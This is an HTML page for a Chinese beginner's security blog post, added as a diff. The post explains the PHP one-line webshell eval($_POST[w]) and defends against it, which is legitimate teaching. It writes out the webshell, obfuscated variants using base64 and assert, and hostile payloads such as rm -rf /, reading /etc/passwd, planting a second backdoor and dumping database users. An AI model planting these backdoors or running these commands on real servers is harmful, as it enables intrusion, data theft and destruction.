@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 什么是木马/Trojan Horse。">
+<meta property="og:title" content="小白学网安之Trojan Horse入门1">
+<meta property="og:description" content="# 什么是木马/Trojan Horse。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://JiangHuYeYu001.github.io/post/xiao-bai-xue-wang-an-zhi-Trojan%20Horse-ru-men-1.html">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Meekdai/meekdai.github.io/logo64.jpg">
+<title>小白学网安之Trojan Horse入门1</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">小白学网安之Trojan Horse入门1</h1>
+<div class="title-right">
+    <a href="https://JiangHuYeYu001.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/JiangHuYeYu001/JiangHuYeYu001.github.io/issues/8" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>什么是木马/Trojan Horse。笔者从来不爱谈概念。我们直接从最简单的一句话木马开始。</h1>
+<h1>我们首先来解析一下一句话木马 <code class="notranslate">&lt;?php eval($_POST[w]);?&gt;</code></h1>
+<p>这是最经典、最基础的 <strong>PHP一句话木马</strong>（也叫“一句话后门”）。<br>
+核心作用是给攻击者留下「远程控制目标服务器」的入口——通过简单代码实现“接收指令+执行指令”。<br>
+下面从「代码拆解、工作原理、攻击流程、危害、防御」五个维度讲一讲：</p>
+<h2>一、逐段拆解代码：每个部分的作用</h2>
+<p>先看完整代码的语法结构（注意：标准写法中 <code class="notranslate">$_POST['w']</code> 建议加引号，无引号在PHP低版本兼容，但不规范，不影响核心功能）：</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>  <span class="pl-c">// PHP代码的开始标记（告诉服务器这是PHP脚本）</span>
+<span class="pl-en">eval</span>(       <span class="pl-c">// 核心执行函数：把字符串当作PHP代码执行（高危！）</span>
+  <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">'<span class="pl-s">w</span>'</span>]  <span class="pl-c">// 接收客户端（攻击者）通过POST方式传递的、名为"w"的参数值</span>
+); 
+<span class="pl-ent">?&gt;</span>  <span class="pl-c">// PHP代码的结束标记</span></pre></div>
+<h3>关键组件详解（核心是「接收指令」+「执行指令」）</h3>
+<ol>
+<li><strong><code class="notranslate">&lt;?php ?&gt;</code></strong>：PHP的代码边界标记，服务器会解析这对标记之间的内容为PHP代码（如果省略结束标记 <code class="notranslate">?&gt;</code>，在单文件脚本中也能正常运行）。</li>
+<li><strong><code class="notranslate">eval()</code> 函数</strong>：PHP的“动态代码执行函数”，它的参数必须是「合法的PHP代码字符串」，执行后会返回代码运行结果。     例子：<code class="notranslate">eval("echo 123;")</code> 等价于直接写 <code class="notranslate">echo 123;</code>，会输出 <code class="notranslate">123</code>；<br>
+危险点：<strong>无论参数是什么字符串，都会被当作PHP代码执行</strong>——这是木马能工作的核心，也是最致命的地方。</li>
+<li><strong><code class="notranslate">$_POST['w']</code></strong>：PHP的「超全局变量」，用于接收客户端通过 <code class="notranslate">POST</code> 请求方式传递的参数：
+<ul>
+<li><code class="notranslate">$_POST</code>：接收POST类型的请求参数（相对于GET请求，POST参数不会显示在URL中，更隐蔽）；</li>
+<li><code class="notranslate">['w']</code>：参数名是 <code class="notranslate">w</code>（攻击者可自定义为任意字符，比如 <code class="notranslate">x</code>、<code class="notranslate">cmd</code> 等，只要前后一致）；</li>
+<li>作用：攻击者通过POST请求，把「想要执行的恶意PHP代码」当作参数值传给服务器。</li>
+</ul>
+</li>
+</ol>
+<h2>二、工作原理：攻击者怎么利用它？</h2>
+<p>整个流程就像“攻击者给服务器发「命令」，服务器执行后返回结果”，步骤如下：</p>
+<h3>1. 前提：木马已上传到目标服务器</h3>
+<p>攻击者通过各种漏洞（比如文件上传漏洞、SQL注入写文件漏洞、服务器配置漏洞），把包含这段代码的文件（比如 <code class="notranslate">shell.php</code>）上传到目标服务器的Web目录下（比如 <code class="notranslate">www/root/</code>、<code class="notranslate">upload/</code>）。</p>
+<h3>2. 攻击者发送恶意指令（POST请求）</h3>
+<p>攻击者用工具（比如蚁剑、菜刀、中国菜刀，或Postman、BurpSuite）向 <code class="notranslate">http://目标服务器IP/shell.php</code> 发送POST请求，核心是传递参数 <code class="notranslate">w</code>，参数值是「想要执行的PHP代码」。</p>
+<h4>举个实际攻击例子：</h4>
+<p>假设目标服务器已上传 <code class="notranslate">shell.php</code>，攻击者发送如下POST请求：</p>
+<ul>
+<li>请求URL：<code class="notranslate">http://xxx.com/shell.php</code></li>
+<li>请求方法：POST</li>
+<li>请求参数：<code class="notranslate">w=system("ls /");</code> （<code class="notranslate">system()</code> 是PHP执行系统命令的函数，<code class="notranslate">ls /</code> 是Linux查看根目录文件的命令）</li>
+</ul>
+<h3>3. 服务器执行指令，返回结果</h3>
+<ul>
+<li>服务器接收请求后，解析 <code class="notranslate">shell.php</code> 中的代码：<code class="notranslate">eval($_POST['w'])</code> 会变成 <code class="notranslate">eval("system('ls /');")</code>；</li>
+<li><code class="notranslate">eval()</code> 把字符串当作PHP代码执行，<code class="notranslate">system("ls /")</code> 会调用服务器的系统命令，列出根目录下的所有文件；</li>
+<li>执行结果会返回给攻击者，攻击者就能看到服务器的文件结构。</li>
+</ul>
+<h2>三、它能做什么？（权限这一块）</h2>
+<p>只要木马没被发现，攻击者几乎能「完全控制目标服务器」，常见恶意操作包括：</p>
+<ol>
+<li><strong>执行系统命令</strong>：
+<ul>
+<li>Linux：<code class="notranslate">system("ls")</code>（列文件）、<code class="notranslate">system("rm -rf /")</code>（删根目录，毁数据）、<code class="notranslate">system("whoami")</code>（查看当前用户权限）；</li>
+<li>Windows：<code class="notranslate">system("dir C:\\")</code>（查看C盘文件）、<code class="notranslate">system("net user")</code>（查看系统用户）；</li>
+</ul>
+</li>
+<li><strong>读写服务器文件</strong>：
+<ul>
+<li>读文件：<code class="notranslate">eval($_POST['w']="echo file_get_contents('/etc/passwd');")</code>（读取Linux系统用户配置文件）；</li>
+<li>写文件：<code class="notranslate">eval($_POST['w']="file_put_contents('后门2.php','&lt;?php eval($_POST[x]);?&gt;');")</code>（再留一个备用后门）；</li>
+</ul>
+</li>
+<li><strong>窃取敏感数据</strong>：
+<ul>
+<li>读取数据库配置文件（比如 <code class="notranslate">config.php</code> 中的数据库账号密码）；</li>
+<li>导出数据库数据（比如执行 <code class="notranslate">mysql -u root -pXXX -e "select * from user"</code> 窃取用户数据）；</li>
+</ul>
+</li>
+<li><strong>提权与横向渗透</strong>：
+<ul>
+<li>如果当前Web用户权限高（比如 <code class="notranslate">root</code>），攻击者可直接控制整台服务器；</li>
+<li>若权限低，可通过漏洞提权，或攻击内网其他服务器。</li>
+</ul>
+</li>
+</ol>
+<h2>四、为什么它很危险呢？</h2>
+<ol>
+<li><strong>隐蔽性极强</strong>：
+<ul>
+<li>代码只有1行，可嵌入到正常PHP文件中（比如混入 <code class="notranslate">index.php</code> 的注释里），很难被发现；</li>
+<li>用POST传参，指令不会暴露在URL中，绕过简单的日志审计；</li>
+</ul>
+</li>
+<li><strong>功能无限制</strong>：<code class="notranslate">eval()</code> 能执行任意PHP代码，而PHP本身能调用系统命令、操作文件/数据库，相当于给攻击者开了“万能权限”；</li>
+<li><strong>门槛极低</strong>：攻击者无需复杂技术，用现成工具（蚁剑、菜刀）就能连接，图形化操作（像操作本地文件一样浏览服务器）。</li>
+</ol>
+<h1>如何来防御一句话木马呢</h1>
+<h2>1. <strong>禁用高危函数</strong>：在PHP配置文件 <code class="notranslate">php.ini</code> 中，将 <code class="notranslate">eval</code>、<code class="notranslate">system</code>、<code class="notranslate">exec</code>、<code class="notranslate">shell_exec</code>、<code class="notranslate">file_put_contents</code> 等高危函数加入 <code class="notranslate">disable_functions</code>（禁用列表）：</h2>
+<div class="highlight highlight-source-ini"><pre class="notranslate"><span class="pl-k">disable_functions</span> = eval,system,exec,shell_exec,passthru,proc_open,file_put_contents</pre></div>
+<h2>2. <strong>限制文件上传</strong>：</h2>
+<ul>
+<li>禁止上传 <code class="notranslate">.php</code> 等可执行脚本文件（后缀白名单：只允许 <code class="notranslate">jpg/png/gif</code> 等静态文件）；</li>
+<li>对上传文件做“内容校验”（比如图片文件要验证是否为真实图片，而非改后缀的PHP文件）；</li>
+</ul>
+<h2>3. <strong>过滤用户输入</strong>：如果业务必须接收用户输入的PHP代码（极少场景），严格过滤 <code class="notranslate">eval</code>、<code class="notranslate">system</code>、<code class="notranslate">exec</code> 等关键词，禁止传递恶意函数；</h2>
+<ol start="4">
+<li><strong>提升服务器安全配置</strong>：
+<ul>
+<li>给Web目录设置「最小权限」（比如Web用户只能读，不能写/执行其他目录文件）；</li>
+<li>开启PHP的 <code class="notranslate">open_basedir</code>（限制PHP只能操作指定目录，防止跨目录读取系统文件）；</li>
+</ul>
+</li>
+<li><strong>定期审计文件</strong>：监控Web目录下的PHP文件变化，及时发现未知的可疑文件（比如突然出现的 <code class="notranslate">shell.php</code>、<code class="notranslate">test.php</code>）；</li>
+<li><strong>更新补丁</strong>：及时更新PHP版本和服务器系统补丁，避免因漏洞被攻击者上传木马。</li>
+</ol>
+<h2>补充：常见变种（换汤不换药的）</h2>
+<p>攻击者为绕过防御，会对一句话木马做简单变形，但核心还是「<code class="notranslate">接收参数+eval执行</code>」：</p>
+<h3>1. 换参数名：<code class="notranslate">&lt;?php eval($_POST['x']);?&gt;</code>（参数名从 <code class="notranslate">w</code> 改成 <code class="notranslate">x</code>）；</h3>
+<h3>2. 换接收方式：<code class="notranslate">&lt;?php eval($_GET['w']);?&gt;</code>（用GET传参，参数会显示在URL中，隐蔽性差）；</h3>
+<h3>3. 编码混淆：<code class="notranslate">&lt;?php eval(base64_decode($_POST['w']));?&gt;</code>（攻击者传递Base64编码后的指令，绕过关键词过滤）；</h3>
+<h3>4. 函数替换：<code class="notranslate">&lt;?php assert($_POST['w']);?&gt;</code>（<code class="notranslate">assert()</code> 也能执行PHP代码，效果和 <code class="notranslate">eval</code> 类似，部分场景可绕过 <code class="notranslate">disable_functions</code>）。</h3>
+<h1>总结</h1>
+<p>这句话最简单的一句话木马的本质是「利用 <code class="notranslate">eval</code> 函数的动态执行特性，将用户输入当作代码执行」，相当于给攻击者留了一把“服务器万能钥匙”。防御的核心是「禁用高危函数+限制文件上传+最小权限配置」，同时定期审计服务器文件，避免木马被植入。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;">转载请注明出处</div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://JiangHuYeYu001.github.io">徐卿年的个人博客</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if("11/20/2025"!=""){
+    var startSite=new Date("11/20/2025");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
